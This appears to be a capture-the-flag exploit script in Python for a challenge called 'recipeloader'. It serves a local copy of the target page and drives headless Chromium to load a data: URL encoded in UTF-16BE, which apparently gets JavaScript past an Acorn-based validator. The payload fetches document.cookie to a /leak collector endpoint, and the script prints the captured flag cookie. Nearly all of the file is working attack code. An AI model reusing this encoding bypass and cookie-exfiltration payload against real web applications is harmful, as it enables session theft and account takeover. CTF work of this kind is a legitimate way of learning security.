import asyncio, http.server, socketserver, threading, urllib.parse
from pathlib import Path
from playwright.async_api import async_playwright

ROOT = Path('/mnt/data/recipeloader_work/recipeloader')
ACORN_PATH = Path('/opt/nvm/versions/node/v22.16.0/lib/node_modules/ts-node/node_modules/acorn/dist/acorn.js')
PORT = 1340
FLAG = 'GPNCTF{LOCAL_TEST_FLAG}'
leaks = []

def build_data_url(exfil_prefix: str) -> str:
    js = f":fetch(`{exfil_prefix}?c=${{encodeURIComponent(document.cookie)}}`)//"
    raw = b'recipe="' + js.encode('utf-16-be') + b'";'
    return 'data:text/javascript;charset=utf-16be,' + urllib.parse.quote_from_bytes(raw, safe='')

index = (ROOT/'index.html').read_text()
index = index.replace('https://cdn.jsdelivr.net/npm/acorn@8/dist/acorn.min.js', '/acorn.js')
# Add a console log after fetch so the local proof records what Acorn sees.
index = index.replace('const txt = await fetch(url).then(r => r.text());',
    'const txt = await fetch(url).then(r => r.text()); console.log("validator sees", JSON.stringify(txt.slice(0,60)), "len", txt.length);')

class ReuseTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print('[http]', fmt % args)
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == '/acorn.js':
            self.send_response(200)
            self.send_header('Content-Type', 'text/javascript')
            self.end_headers()
            self.wfile.write(ACORN_PATH.read_bytes())
        elif parsed.path == '/leak':
            c = urllib.parse.parse_qs(parsed.query).get('c', [''])[0]
            leaks.append(c)
            self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers(); self.wfile.write(index.encode())

async def main():
    with ReuseTCPServer(('127.0.0.1', PORT), Handler) as srv:
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        data_url = build_data_url(f'http://localhost:{PORT}/leak')
        target = f'http://localhost:{PORT}/?url=' + urllib.parse.quote(data_url, safe='')
        print('[+] bot target:', target[:240] + '...')
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True, executable_path='/usr/bin/chromium', args=['--no-sandbox'])
            page = await browser.new_page()
            page.on('console', lambda msg: print('[console]', msg.text))
            await page.goto(f'http://localhost:{PORT}/')
            await page.evaluate("flag => document.cookie = 'flag' + flag", FLAG)
            print('[+] cookie before exploit:', await page.evaluate('document.cookie'))
            await page.goto(target, wait_until='domcontentloaded')
            await page.wait_for_timeout(1000)
            print('[+] leaks:', leaks)
            await browser.close()
        srv.shutdown()

if __name__ == '__main__':
    asyncio.run(main())
